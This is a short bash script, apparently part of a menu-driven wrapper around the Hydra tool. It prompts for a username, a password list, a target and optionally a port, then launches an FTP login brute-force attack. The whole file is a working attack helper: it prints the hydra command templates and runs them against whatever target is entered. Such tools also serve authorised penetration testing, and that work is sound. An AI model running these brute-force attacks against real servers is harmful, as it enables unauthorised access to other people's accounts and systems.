#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
FTP Query
FTP Command

1. Basic FTP login attack
hydra -l [username] -P [passwordlist] ftp://[target]
2. FTP attack with port
hydra -l [username] -P [passwordlist] -s [port] ftp://[target]
EOF

read -r -p $'\nSelect-Options>Hydra>FTP>' select

case "$select" in
  1)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" "ftp://$target"
    ;;
  2)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input port> " port
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" -s "$port" "ftp://$target"
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac

